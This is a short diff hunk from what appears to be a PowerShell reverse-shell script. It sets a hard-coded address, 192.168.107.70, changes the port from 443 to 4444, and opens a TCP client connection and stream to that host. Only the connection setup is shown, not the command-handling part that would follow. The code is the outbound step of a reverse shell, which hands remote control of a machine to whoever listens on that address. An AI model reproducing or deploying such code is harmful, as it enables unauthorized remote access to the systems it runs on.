@@ -5,7 +5,7 @@ exit}
 // Setup IPADDR
 $address = '192.168.107.70'
 // Setup PORT
-$port = '443'
+$port = '4444'
 $client = New-Object system.net.sockets.tcpclient
 $client.connect($address,$port)
 $stream = $client.GetStream()
